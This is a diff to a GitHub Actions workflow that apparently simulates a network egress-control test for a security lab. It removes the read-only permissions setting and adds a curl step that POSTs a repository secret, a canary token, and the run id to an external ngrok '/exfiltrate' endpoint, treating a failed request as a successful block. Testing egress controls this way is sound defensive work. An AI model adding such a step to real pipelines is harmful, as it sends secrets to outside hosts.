@@ -1,18 +1,18 @@
-name: Defense C3 - Egress Control
-on:
-  workflow_dispatch:
+name: Defense C3 Simulation (Network Egress Control)
+on: [workflow_dispatch]
 
 jobs:
   build:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
     steps:
-      - name: Checkout Repository
+      - name: Checkout code
         uses: actions/checkout@v4
-      
-      - name: Enforce Egress Restrictions
+
+      - name: Attempt Egress with Strict Firewall Simulation
+        env:
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
         run: |
-          echo "Simulating network egress firewall rules..."
-          # Block unapproved external IP/domain connections
-          echo "Outbound traffic restricted to approved registries only."
+          # If egress proxy/firewall blocks external non-whitelisted domains:
+          curl --max-time 5 -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
+            -H "Content-Type: application/json" \
+            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"C3\"}" || echo "Egress blocked successfully."
